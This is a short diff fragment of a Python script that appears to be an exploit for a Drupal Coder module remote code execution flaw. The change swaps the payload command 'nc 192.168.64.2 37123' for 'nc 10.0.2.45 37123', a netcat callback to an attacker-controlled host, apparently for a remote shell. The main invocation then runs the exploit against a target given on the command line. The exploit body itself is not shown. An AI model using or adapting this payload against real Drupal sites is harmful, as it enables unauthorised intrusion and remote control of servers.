@@ -37,5 +37,5 @@ class DrupalCoderExec:
         
 
 if __name__ == "__main__":
-    coder_exec = DrupalCoderExec('nc 192.168.64.2 37123')
+    coder_exec = DrupalCoderExec('nc 10.0.2.45 37123')
     coder_exec.exploit(sys.argv[1], sys.argv[2], sys.argv[3])
